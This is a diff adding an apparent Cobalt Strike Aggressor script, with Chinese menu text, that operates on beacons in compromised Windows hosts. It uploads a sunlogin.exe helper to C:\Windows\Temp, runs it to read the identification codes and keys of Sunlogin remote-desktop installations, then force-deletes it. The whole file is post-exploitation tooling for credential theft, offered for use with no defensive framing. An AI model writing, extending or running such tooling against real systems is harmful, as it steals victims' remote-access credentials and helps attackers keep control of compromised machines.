@@ -1,0 +1,26 @@
+	menu "Sunlogin" {
+			item "上传 Sunlogin" {
+				$bid = $1;
+				$dialog = dialog("上传 Sunlogin", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sunupload);
+                dialog_description($dialog, "用于向日葵老版本的绿色版和安装版以及版本>v11.1.2.38529新版本的识别码和密钥的读取\n经过测试新版本部分向日葵加密方式仍然未变，如果新版本不能解密，请等待后续解密脚本。");
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub sunupload {
+
+    bcd($bid, $3['UploadPath']);
+    bupload($bid, script_resource("/script/Sunlogin/sunlogin.exe"));
+}
+
+    item "运行 Sunlogin"{
+            bshell($1, "sunlogin.exe");
+                }
+
+        	item "删除 Sunlogin"{
+        	local('$bid');
+        	foreach $bid ($1){
+                bshell($1, "del /f /s /q sunlogin.exe");
+                }
+		}
+}
